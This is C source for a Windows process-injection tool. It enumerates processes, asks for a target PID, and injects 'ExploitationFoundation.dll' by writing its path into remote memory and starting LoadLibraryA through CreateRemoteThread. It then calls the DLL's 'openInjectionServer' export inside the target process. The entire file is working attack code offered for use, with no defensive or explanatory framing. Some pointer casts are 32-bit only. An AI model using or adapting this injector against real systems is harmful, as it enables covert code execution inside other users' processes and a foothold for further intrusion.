#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <Shlwapi.h>

#define INJECTION_DLL_NAME "ExploitationFoundation"
#define INJECTION_ENTRY_FN "openInjectionServer"
#define BUFFER_SIZE 1024

DWORD cleanup(DWORD error);
void PrintProcessNameAndID(DWORD processID);

HANDLE hProcess, hThread;
LPVOID remoteBuffer;
int main(void) {

	//
	// Get the list of process identifiers.
	DWORD aProcesses[BUFFER_SIZE], cbNeeded, cProcesses;
	unsigned int i;

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		return 1;
	}

	//
	// Calculate how many process identifiers were returned.
	cProcesses = cbNeeded / sizeof(DWORD);

	//
	// Print the name and process identifier for each process.
	for (i = 0; i < cProcesses; i++)
	{
		if (aProcesses[i] != 0)
		{
			PrintProcessNameAndID(aProcesses[i]);
		}
	}

	DWORD procId;

	printf("What id the id of the target process?\n");
	scanf("%d", &procId);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, true, procId);

	if (hProcess == NULL) {
		printf("Failed to open process with id: %d", procId);
		return cleanup(GetLastError());
	}

	remoteBuffer = VirtualAllocEx(hProcess, NULL, BUFFER_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (remoteBuffer == NULL) {
		printf("Could not allocate buffer in remote process\n");
		return cleanup(GetLastError());
	}

	char input[BUFFER_SIZE];
	printf("What is the location of " INJECTION_DLL_NAME ".dll?\n");
	do {
		fgets(input, BUFFER_SIZE, stdin);
	} while (input[0] == '\n');

	int len = strlen(input);
	if (input[len - 1] == '\n') {
		input[len - 1] = '\0';
	}

	PathCombineA(input, input, INJECTION_DLL_NAME ".dll");

	BOOL res;
	SIZE_T written;
	res = WriteProcessMemory(hProcess, remoteBuffer, input, BUFFER_SIZE, &written);

	if (!res) {
		printf("Problem writing to remote process.\n");
		return cleanup(GetLastError());
	}

	char output[BUFFER_SIZE];
	SIZE_T read;
	res = ReadProcessMemory(hProcess, remoteBuffer, output, BUFFER_SIZE, &read);

	if (res == 0) {
		printf("Could not read the remote process memory.\n");
		return cleanup(GetLastError());
	}

	FARPROC fnLoadLibrary;
	fnLoadLibrary = GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryA");

	if (fnLoadLibrary == NULL) {
		printf("Failed to get LoadLibrary.\n");
		return cleanup(GetLastError());
	}

	LPDWORD rmThreadId;
	hThread = CreateRemoteThread(hProcess, NULL, 0x1000000, (LPTHREAD_START_ROUTINE) fnLoadLibrary, remoteBuffer, 0, NULL);

	if (hThread == NULL) {
		printf("Error creating remote thread.\n");
		return cleanup(GetLastError());
	}

	DWORD waitResult;
	waitResult = WaitForSingleObject(hThread, 10000);

	if (waitResult == WAIT_TIMEOUT) {
		printf("Waiting for remote thread timed out.\n");
		return cleanup(GetLastError());
	}
	else if (waitResult == WAIT_FAILED) {
		printf("Waiting for remote thread failed.\n");
		return cleanup(GetLastError());
	}
	else if (waitResult == WAIT_ABANDONED) {
		printf("Waiting for remote process abandoned");
		return cleanup(GetLastError());
	}

	DWORD remoteDll;
	res = GetExitCodeThread(hThread, &remoteDll);
	
	if (res == 0) {
		printf("Failure getting thread exit code.\n");
		return cleanup(GetLastError());
	}

	printf("Remote thread completed. Dll injection successful");

	char* pipeName = "exploit";
	res = WriteProcessMemory(hProcess, remoteBuffer, pipeName, BUFFER_SIZE, &written);

	if (!res) {
		printf("Problem writing to remote process.\n");
		printf("Tried to write %s.", input);
		return cleanup(GetLastError());
	}

	res = ReadProcessMemory(hProcess, remoteBuffer, output, BUFFER_SIZE, &read);

	if (res == 0) {
		printf("Could not read the remote process memory.\n");
		return cleanup(GetLastError());
	}

	HMODULE exploitDll;
	exploitDll = LoadLibraryA(input);

	if (exploitDll == NULL) {
		printf("Could not load the injection dll in the local process.\n");
		return cleanup(GetLastError());
	}

	FARPROC fnInjectionEntry;
	fnInjectionEntry = GetProcAddress(exploitDll, INJECTION_ENTRY_FN);

	if (fnInjectionEntry == NULL) {
		printf("Failed to get " INJECTION_ENTRY_FN ".\n");
		return cleanup(GetLastError());
	}

	DWORD injectionEntryOffset = (DWORD)fnInjectionEntry - (DWORD)exploitDll;

	fnInjectionEntry = (FARPROC)((DWORD)remoteDll + injectionEntryOffset);

	hThread = CreateRemoteThread(hProcess, NULL, 0x1000000, (LPTHREAD_START_ROUTINE) fnInjectionEntry, remoteBuffer, 0, NULL);

	if (hThread == NULL) {
		printf("Error creating remote thread for" INJECTION_ENTRY_FN ".\n");
		return cleanup(GetLastError());
	}

	waitResult = WaitForSingleObject(hThread, 10000);

	if (waitResult == WAIT_TIMEOUT) {
		printf("Waiting for remote thread timed out.\n");
		return cleanup(GetLastError());
	}
	else if (waitResult == WAIT_FAILED) {
		printf("Waiting for remote thread failed.\n");
		return cleanup(GetLastError());
	}
	else if (waitResult == WAIT_ABANDONED) {
		printf("Waiting for remote process abandoned");
		return cleanup(GetLastError());
	}

	DWORD injectionEntryResult;
	res = GetExitCodeThread(hThread, &injectionEntryResult);
	
	if (res == 0) {
		printf("Failure getting thread exit code from " INJECTION_ENTRY_FN  ".\n");
		return cleanup(GetLastError());
	}

	printf("Remote thread completed. " INJECTION_ENTRY_FN  " successful");

	return cleanup(0);
}

DWORD cleanup(DWORD error) {
	if (hProcess != NULL) {
		CloseHandle(hProcess);
		hProcess = NULL;
	}

	if (hThread != NULL) {
		CloseHandle(hThread);
		hThread = NULL;
	}

	if (remoteBuffer != NULL) {
		VirtualFree(remoteBuffer, BUFFER_SIZE, MEM_RELEASE);
	}

	BOOL res;
	char *message;

	if (error != 0) {
		res = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, error, NULL, (LPSTR)&message, 100, NULL);

		if (!res) {
			printf("%s\n", message);
			return GetLastError();
		}
	}

	return error;
}

void PrintProcessNameAndID(DWORD processID)
{
	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

	// Get a handle to the process.

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
		PROCESS_VM_READ,
		FALSE, processID);

	// Get the process name.

	if (NULL != hProcess)
	{
		HMODULE hMod;
		DWORD cbNeeded;

		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
			&cbNeeded))
		{
			GetModuleBaseName(hProcess, hMod, szProcessName,
				sizeof(szProcessName) / sizeof(TCHAR));
		}
	}

	// Print the process name and identifier.

	_tprintf(TEXT("%s  (PID: %u)\n"), szProcessName, processID);

	// Release the handle to the process.

	CloseHandle(hProcess);
}